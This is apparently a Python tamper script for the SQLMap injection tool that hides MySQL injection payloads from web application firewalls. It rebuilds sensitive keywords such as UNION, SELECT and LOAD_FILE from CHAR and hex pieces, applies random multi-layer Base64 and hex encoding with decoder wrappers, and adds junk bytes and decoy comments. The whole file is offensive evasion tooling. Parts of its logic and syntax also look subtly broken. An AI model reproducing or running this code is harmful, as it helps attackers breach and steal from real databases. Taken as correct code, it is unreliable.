#!/usr/bin/env python

"""
perfect_stealth_v3.py

SQLMap tamper script focusing on advanced WAF evasion via character construction,
dynamic, multi-layered encoding (Base64/Hex only), and enhanced obfuscation.
Designed for MySQL, fixing prior logical errors in SQL generation.
"""

import random
import re
import base64
from urllib.parse import quote # Still imported for potential future standalone use or different contexts

# Define a set of highly sensitive keywords that will be character-constructed
SENSITIVE_KEYWORDS = [
    "SELECT", "FROM", "WHERE", "AND", "OR", "UNION", "ORDER BY", "GROUP BY",
    "HAVING", "LIMIT", "OFFSET", "INTO", "OUTFILE", "DUMPFILE", "LOAD_FILE",
    "SLEEP", "BENCHMARK", "VERSION", "DATABASE", "USER", "CURRENT_USER", "SCHEMA",
    "TABLE_NAME", "COLUMN_NAME", "INFORMATION_SCHEMA"
]

# Encoding schemes and their corresponding SQL decoding functions for MySQL
# ONLY schemes with DIRECT SQL decoding functions are included for chaining.
# URL encoding is excluded from this chain to prevent SQL parsing errors.
ENCODING_SCHEMES_CHAINABLE = {
    'base64': {'encode': lambda s: base64.b64encode(s.encode('latin1')).decode('latin1'), 'decode_sql': 'FROM_BASE64'},
    'hex': {'encode': lambda s: s.encode('latin1').hex(), 'decode_sql': 'UNHEX'},
}

def dependencies():
    pass

def _char_construct_keyword(keyword_original):
    """
    Dynamically constructs a keyword using CHAR() or CONCAT(0x...) for MySQL,
    with increased polymorphism.
    """
    if not keyword_original:
        return ""

    parts = []
    # More aggressively mix CHAR() and CONCAT(0x...) per character
    for char_val in keyword_original.upper():
        if random.choice([True, False]): # Randomly choose method per character
            parts.append(f"CHAR({ord(char_val)})")
        else:
            parts.append(f"0x{ord(char_val):02x}")

    # Wrap in CONCAT regardless of method choice for consistent structure
    return f"CONCAT({','.join(parts)})"

def _dynamic_encoding_chain_with_decoder(payload_part):
    """
    Applies a dynamic chain of *database-decodable* encodings to a payload part,
    and returns the encoded string along with its SQL decoding wrapper.
    Ensures SQL-functional integrity by only chaining compatible encodings.
    """
    if not payload_part:
        return "", ""

    current_encoded_payload = payload_part
    sql_decode_wrappers = []
    
    # Randomly select a chain length between 2 and 5 layers for increased obfuscation
    chain_length = random.randint(2, 5)
    
    available_schemes_keys = list(ENCODING_SCHEMES_CHAINABLE.keys())
    
    for i in range(chain_length):
        if not available_schemes_keys: # Cycle through schemes if chain_length is greater than available_schemes
            available_schemes_keys = list(ENCODING_SCHEMES_CHAINABLE.keys())
            
        scheme_name = random.choice(available_schemes_keys) # Randomly pick a scheme from available
        scheme = ENCODING_SCHEMES_CHAINABLE[scheme_name]

        try:
            current_encoded_payload = scheme['encode'](current_encoded_payload)
            
            # For hex, occasionally inject junk bytes
            if scheme_name == 'hex' and random.random() < 0.3: # 30% chance to inject junk
                junk_pos = random.randint(0, len(current_encoded_payload))
                current_encoded_payload = current_encoded_payload[:junk_pos] + format(random.randint(0, 255), '02x') + current_encoded_payload[junk_pos:]

            # Prepend the SQL decoding function to build the chain inside-out
            if scheme['decode_sql'] == 'FROM_BASE64':
                sql_decode_wrappers.insert(0, f"FROM_BASE64(CONVERT(%s USING latin1))")
            elif scheme['decode_sql'] == 'UNHEX':
                sql_decode_wrappers.insert(0, f"UNHEX(%s)")
            
        except Exception as e:
            # If encoding fails, fall back and break the chain to avoid malformed payload
            current_encoded_payload = payload_part
            sql_decode_wrappers = []
            break 

    # Construct the final SQL wrapper string
    final_sql_wrapper = "%s"
    for wrapper_template in sql_decode_wrappers:
        final_sql_wrapper = wrapper_template % final_sql_wrapper
        
    return current_encoded_payload, final_sql_wrapper

def tamper(payload, **kwargs):
    """
    This tamper function applies character construction for sensitive keywords
    and dynamic encoding chains to the entire payload or critical parts,
    with enhanced robustness against database parsing errors.
    """
    if payload:
        ret = payload

        # Step 1: Replace sensitive keywords with character-constructed versions
        for keyword in sorted(SENSITIVE_KEYWORDS, key=len, reverse=True):
            if re.search(r"\b%s\b" % re.escape(keyword), ret, re.IGNORECASE):
                ret = re.sub(r"\b%s\b" % re.escape(keyword), _char_construct_keyword(keyword), ret, flags=re.IGNORECASE)

        # Step 2: Apply dynamic, database-decodable encoding chain to the entire modified payload
        encoded_payload, sql_decoder = _dynamic_encoding_chain_with_decoder(ret)
        
        # Inject dynamic junk comments for further disruption
        junk_comment = f"/*{random.choice(['UNION', 'SELECT', 'OR', 'AND'])} {random.randint(1000,9999)}*/"
        
        # Wrap the encoded payload in the SQL decoder functions and add a comment
        ret = f"{junk_comment} {sql_decoder % f\"'{encoded_payload}'\"}"

        return ret
    return payload

